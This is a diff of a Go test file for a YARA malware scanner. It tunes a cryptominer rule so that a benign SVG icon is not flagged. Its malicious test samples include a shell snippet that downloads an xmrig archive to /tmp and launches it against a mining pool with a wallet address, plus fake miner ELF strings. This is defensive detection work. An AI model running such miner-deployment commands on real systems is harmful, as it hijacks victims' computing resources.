@@ -353,27 +353,43 @@ func TestFPFlood_MinerXmrigBinaryRef_SvgBase64Blob(t *testing.T) {
 	s := loadRepoYaraScanner(t)
 	// A 45x45 marketing icon whose embedded base64 raster data happens to
 	// contain the substring "XMrIG" -- the real prod FP on the WebToffee
-	// wt-woocommerce-related-products admin/img best-sellers-plugin.svg. The
-	// bare miner name is not enough; a genuine miner binary carries mining
-	// context (stratum/algo/donate-level) which a marketing SVG never does.
+	// wt-woocommerce-related-products admin/img best-sellers-plugin.svg.
+	// Generic RandomX, NiceHash, and --coin text elsewhere in stock code must
+	// not corroborate the chance match.
 	legit := []byte(`<svg width="45" height="45" viewBox="0 0 45 45" fill="none" xmlns="http://www.w3.org/2000/svg">` +
-		`<image href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAF1foSTmiKVo/zuo3eO93KENzuRkGnLLMCFjfmN50XMrIGPdgLsIIf1ZhbAHZ7/Crggz6sC/YXVVpBSciSEs98"/></svg>`)
+		`<image href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAF1foSTmiKVo/zuo3eO93KENzuRkGnLLMCFjfmN50XMrIGPdgLsIIf1ZhbAHZ7/Crggz6sC/YXVVpBSciSEs98"/>` +
+		`<script>var RandomX=function(){this.init=function(){}};var providers=["NiceHash"];var help="--coin";</script></svg>`)
 	if hasYaraRule(s.ScanBytes(legit), "miner_xmrig_binary_ref") {
-		t.Error("miner_xmrig_binary_ref FP: matched XMrIG substring inside SVG base64 image data")
+		t.Error("miner_xmrig_binary_ref FP: generic mining text corroborated XMrIG inside SVG base64 image data")
 	}
 	mal := []byte(`#!/bin/sh
-cd /tmp && curl -s https://xmrig.com/download/xmrig-linux.tar.gz -o x.tgz && tar xf x.tgz
-./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 48WalletAddr --coin monero --donate-level 1 --cpu-priority 5`)
+curl -s https://downloads.example/xmrig-linux.tar.gz -o /tmp/x.tgz
+./xmrig -o stealth-pool.example:4444 -u 48WalletAddr`)
 	if !hasYaraRule(s.ScanBytes(mal), "miner_xmrig_binary_ref") {
-		t.Error("miner_xmrig_binary_ref regression: real xmrig downloader/launcher not detected")
+		t.Error("miner_xmrig_binary_ref regression: custom-pool xmrig launcher not detected")
 	}
 }
 
 func TestFPFlood_MinerXmrigBinaryRef_ElfBinaryStrings(t *testing.T) {
 	s := loadRepoYaraScanner(t)
-	// The xmrig ELF itself carries its name alongside algo/protocol strings.
-	binary := []byte("\x7fELF\x02\x01\x01xmrig 6.21.0\x00randomx\x00cryptonight\x00stratum+tcp\x00donate-level\x00")
+	binaries := [][]byte{
+		[]byte("\x7fELF\x02\x01\x01xmrig 6.21.0\x00randomx\x00cryptonight\x00stratum+tcp\x00donate-level\x00"),
+		[]byte("\x7fELF\x02\x01\x01xmrig\x00rx/0\x00"),
+	}
+	for _, binary := range binaries {
+		if !hasYaraRule(s.ScanBytes(binary), "miner_xmrig_binary_ref") {
+			t.Errorf("miner_xmrig_binary_ref regression: xmrig ELF strings not detected: %q", binary)
+		}
+	}
+}
+
+func TestFPFlood_MinerXmrigBinaryRef_XmrStakNeedsContext(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	if hasYaraRule(s.ScanBytes([]byte("release notes mention xmr-stak as an alternative")), "miner_xmrig_binary_ref") {
+		t.Error("miner_xmrig_binary_ref FP: bare xmr-stak mention matched without mining context")
+	}
+	binary := []byte("\x7fELF\x02\x01\x01xmr-stak-rx\x00randomx_monero\x00pool configuration\x00")
 	if !hasYaraRule(s.ScanBytes(binary), "miner_xmrig_binary_ref") {
-		t.Error("miner_xmrig_binary_ref regression: xmrig ELF strings not detected")
+		t.Error("miner_xmrig_binary_ref regression: contextual xmr-stak binary strings not detected")
 	}
 }
